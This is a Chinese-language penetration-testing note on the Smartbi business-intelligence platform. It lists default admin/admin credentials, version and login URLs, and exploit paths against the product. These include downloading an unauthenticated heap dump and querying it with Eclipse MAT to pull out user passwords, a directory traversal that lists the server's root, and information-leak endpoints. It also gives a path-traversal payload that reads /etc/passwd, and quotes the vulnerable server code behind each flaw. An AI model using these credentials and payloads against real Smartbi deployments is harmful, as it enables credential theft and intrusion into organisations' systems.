# Smartbi

**默认用户名密码**
```
admin admin
```

**版本查看**
```
http://ip/vision/version.txt
http://ip/vision/packageinfo.txt
```

**登陆地址**
```
http://ip/vision/mobileportal.jsp // 移动驾驶舱
http://ip/vision/mobileX/login // 移动驾驶舱
http://ip/vision/index.jsp
```

## 漏洞

|漏洞名称|访问路径|
|:---:|:---:|
|heapdump抓取密码|`/vision/monitor/heapdump.jsp`|
|目录遍历|`/vision/chooser.jsp?key=&root=%2F`|
|信息泄漏|`/vision/monitor/sysprops.jsp`|

### heapdump抓取密码
访问如下地址，点击下载，即可得到`HeapDump.bin`
```
https://ip/vision/monitor/heapdump.jsp
```
利用`Eclipse Memory Analyze`工具来分析`HeapDump.bin`，工具下载地址：https://www.eclipse.org/mat/previousReleases.php

工具中有个图标名为`OQL`的功能（Open Object Query Language studio to execute statements），输入如下查询语句，可以得到用户的密码
```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
```

`heapdump.jsp`核心代码如下，会将heapDump中的内容打包到HeapDump.bin文件中
```java
if(request.getParameter("dumpbin") != null) {
	if(log.canHeapDump()) {
		java.util.zip.ZipOutputStream zip = new java.util.zip.ZipOutputStream(response.getOutputStream());
		java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry("HeapDump.bin");
		zip.putNextEntry(entry);
		log.heapDump(zip , false, false); // 生成heapdump
		zip.closeEntry();
		zip.flush();
		zip.close();
	}...
}
```
一般堆内存查询的主要思路是用JDK自带的tools.jar类库中`com.sun.tools.attach.VirtualMachine`类或其实现类。该类可以获取JVM相关控制权限。获取要监控的JVM的进程号，利用`VirtualMachine.attach()`方法，获取VirtualMachine的实例对象，然后通过实例对象调用`VirtualMachine.heapHisto()`方法，参数为`–all`, 可获到JVM的堆内存信息。如果想要打包出来则是调用`VirtualMachine.dumpHeap()`方法。此漏洞heapDump的实现代码如下
```java
HotSpotVirtualMachine machine = (HotSpotVirtualMachine)((AttachProvider)provider).attachVirtualMachine(pid);
InputStream is = machine.dumpHeap(new Object[]{tmp.getCanonicalPath(), all ? "-all" : "-live"});
ByteArrayOutputStream baos = new ByteArrayOutputStream();
byte[] buff = new byte[1024];

int readed;
while((readed = is.read(buff)) > 0) {
    baos.write(buff, 0, readed);
}

is.close();
```

### 目录遍历
访问地址如下，可以看到操作系统根目录下的文件夹列出在屏幕上
```
/vision/chooser.jsp?key=&root=%2F
```
chooser.jsp的核心如下，其中`new File()`的用法需要注意，它不仅可以创建文件名还可以创建目录，所以如果root传入的是`.`代表当前目录或是`/`根目录，它的exists()判断都是为真的。
```jsp
<%
	String key = request.getParameter("key");
	String path = request.getParameter("root");
	String pathValue = (path == null || "null".equals(path)) ? null : path;
	if (pathValue != null && !new File(pathValue).exists()) {
		pathValue = null;
		path = "";
	}
	ArrayList folders = getFolderNames(pathValue,key);
%>
```
getFolderNames方法如下，根据传入的路径列出目录下的文件夹，或者直接列出操作系统根目录下的文件夹
```java
public static ArrayList getFolderNames(String parentPath, String key) {
    ArrayList result = new ArrayList();
    File[] fs = null;
    if (parentPath == null)
        fs = File.listRoots();
    else {
        File f = new File(parentPath); 
        if (f.exists())
            fs = f.listFiles();
        else
            fs = File.listRoots();
    }
    if (fs != null) {
        File f = null;
        for (int i = 0; i < fs.length; i++) {
            f = fs[i];
            if (f.isDirectory() || key.equalsIgnoreCase("DATAFILE")) {
                String path = f.getPath();
                if (path.indexOf("System Volume Information") == -1)
                    result.add(path.replaceAll("\\\\", "/"));
            }
        }
    }
    return result;
}
```
### 信息泄漏
访问地址如下，可以看到包含了操作系统、Java、用户路径的相关信息
```
/vision/monitor/sysprops.jsp -> 操作系统参数
/vision/monitor/hardwareinfo.jsp -> 局域网内的ip地址
/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode -> 包含的第三方库
```
sysprops.jsp的核心代码，主要是`System.getProperties();`获取了系统参数
```
Properties prop = System.getProperties();
List list = new ArrayList(prop.keySet());
Collections.sort(list);
for(int i = 0; i < list.size(); i++) {
	String key = String.valueOf(list.get(i));
	String value = String.valueOf(prop.getProperty(key));
	out.println("<tr><td>" + key + "</td><td>" + value + "</td></tr>");
}
```
### 其他漏洞
在v85以下还可能存在任意文件下载漏洞，payload如下
```
vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx
```
